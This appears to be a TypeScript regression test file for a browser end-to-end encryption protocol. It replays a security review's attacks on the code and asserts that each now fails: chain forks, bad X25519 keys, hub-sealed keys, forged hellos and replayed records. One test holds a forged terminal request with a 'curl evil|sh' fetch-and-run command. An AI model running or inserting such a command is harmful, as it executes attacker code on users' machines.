// The security review's attack proofs-of-concept against the browser half,
// kept as regressions: each runs the attack as written against the first M0
// cut and asserts that it now fails.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";
import {
  bytes,
  ChainClock,
  ChainError,
  ChainState,
  type DeviceInfo,
  fromHex,
  generateDeviceKeys,
  genesisDraft,
  isValidX25519,
  signDraft,
} from "../src/lib/e2e/index.js";

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const V: any = JSON.parse(readFileSync(new URL("../../crates/droppen-proto/vectors/rust.json", import.meta.url), "utf8"));

async function dev(id: string, full = true) {
  const k = await generateDeviceKeys();
  const info: DeviceInfo = { id, signKey: k.signPublic, dhKey: k.dhPublic, full };
  return { k, info };
}

// M5. Concurrent ChainState.apply used to accept two different entries for the
// same seq — a fork merged into one view.
test("concurrent apply can no longer merge a fork", async () => {
  const ak = (await crypto.subtle.generateKey({ name: "Ed25519" }, false, ["sign", "verify"])) as CryptoKeyPair;
  const akPub = new Uint8Array(await crypto.subtle.exportKey("raw", ak.publicKey));
  const clock = ChainClock.history();
  const d0 = await dev("dev-0");
  const d1 = await dev("dev-1");
  const st = await ChainState.verify([await signDraft(genesisDraft("acct", akPub, d0.info, null, 1), ak.privateKey)], undefined, clock);
  await st.apply(await signDraft(st.draft({ type: "device", id: "dev-0" }, { type: "addDevice", device: d1.info }, 2), d0.k.sign.privateKey), clock);
  // Fork at seq 2: dev-0 removes dev-1 while dev-1 adds dev-x.
  const dx = await dev("dev-x");
  const rm = await signDraft(st.draft({ type: "device", id: "dev-0" }, { type: "removeDevice", id: "dev-1" }, 3), d0.k.sign.privateKey);
  const addx = await signDraft(st.draft({ type: "device", id: "dev-1" }, { type: "addDevice", device: dx.info }, 3), d1.k.sign.privateKey);
  const results = await Promise.allSettled([st.apply(rm, clock), st.apply(addx, clock)]);
  assert.deepEqual(
    results.map((r) => r.status),
    ["fulfilled", "rejected"],
  );
  assert.ok((results[1] as PromiseRejectedResult).reason instanceof ChainError);
  assert.equal(st.seq, 2);
  assert.equal(st.device("dev-1"), undefined, "the removal won");
  assert.equal(st.device("dev-x"), undefined, "and the fork's addition did not sneak in");
});

// Low-order and non-canonical X25519 keys: the browser must refuse exactly what Rust refuses.
test("x25519 key validity agrees with Rust at the edges (0, 1, p-1, p, p+1, high bit)", async () => {
  const le = (n: bigint) => {
    const b = bytes(32);
    let v = n;
    for (let i = 0; i < 32; i++) {
      b[i] = Number(v & 0xffn);
      v >>= 8n;
    }
    return b;
  };
  const P = 2n ** 255n - 19n;
  for (const k of [le(0n), le(1n), le(P - 1n), le(P), le(P + 1n), le(1n + 2n ** 255n)]) {
    assert.equal(await isValidX25519(k), false);
  }
  for (const c of V.keys.x25519Candidates) assert.equal(await isValidX25519(fromHex(c.key)), c.valid, c.key);
});

// C2. Anonymous sealing let the hub seal its own MK to an agent (or a UK to a
// device). Deliveries are now sender-authenticated and accepted only from a
// current full device of the verified chain.
test("a hub-sealed MK is refused, whoever it claims to come from", async () => {
  const { ChainState, ChainClock, decodeEntry, keyPairFromSecret, sealTo, unwrapMachineKeyFromChain, WrapError } = await import("../src/lib/e2e/index.js");
  const chain = await ChainState.verify(V.chain.entries.map((e: string) => decodeEntry(fromHex(e))), undefined, ChainClock.history());
  const agent = await keyPairFromSecret(fromHex(V.chain.machine.dhSecret));
  const hub = await keyPairFromSecret(new Uint8Array(32).fill(0x42));
  for (const sender of ["dev-0", "hub", "dev-1", "dev-2"]) {
    const ctx = { purpose: "machineKey" as const, account: "acct-1", sender, recipient: "m-1", epoch: 0 };
    const sealed = await sealTo(hub, agent.publicKey, ctx, new Uint8Array(32).fill(0x66));
    await assert.rejects(unwrapMachineKeyFromChain(agent, "m-1", chain, ctx, sealed), WrapError, sender);
  }
});

// M1. The first message used to carry a request — forgeable by anyone holding
// the agent's static key, and replayable. A hello is now a chain view and
// client metadata; a request-shaped payload does not parse.
test("a first message can no longer carry a request", async () => {
  const { decodeHelloBody, utf8 } = await import("../src/lib/e2e/index.js");
  const forged = utf8('{"rpc":"POST /api/terminals/1/input","data":"curl evil|sh\\n"}');
  assert.throws(() => decodeHelloBody(forged));
});

// M5 / M2. Two concurrent reads used to accept one record twice; and records
// were accepted without anything the machine signed.
test("concurrent pushes take a record once, and nothing is released without the machine's head", async () => {
  const { importMachineKey, streamId, streamKey, sealRecord, LogReader, RecordError, signStreamHead, recordLink, importEd25519Private, publicFromSecret } = await import(
    "../src/lib/e2e/index.js"
  );
  const mk = await importMachineKey(new Uint8Array(32).fill(7));
  const sid = await streamId(mk, "claude", "s1");
  const key = await streamKey(mk, sid);
  const machineSeed = new Uint8Array(32).fill(8);
  const machine = await importEd25519Private(machineSeed);
  const machinePub = await publicFromSecret("Ed25519", machineSeed);
  const rec0 = await sealRecord(key, sid, 0, 0, 1, new Uint8Array(32), new TextEncoder().encode("hello"));
  const rd = LogReader.fromStart(sid, machinePub);
  await rd.addEpoch(0, mk);
  const results = await Promise.allSettled([rd.push(rec0), rd.push(rec0)]);
  assert.deepEqual(results.map((r) => r.status), ["fulfilled", "rejected"]);
  assert.equal(rd.confirmed, 0, "held until a head covers it");
  // A stream-key holder's record, signed by itself rather than the machine.
  const thief = await importEd25519Private(new Uint8Array(32).fill(9));
  const link = await recordLink(sid, new Uint8Array(32), rec0);
  await assert.rejects(rd.confirm(await signStreamHead({ stream: sid, nextSeq: 1, epoch: 0, link, timeMs: 1 }, thief)), RecordError);
  assert.equal((await rd.confirm(await signStreamHead({ stream: sid, nextSeq: 1, epoch: 0, link, timeMs: 1 }, machine))).length, 1);
});
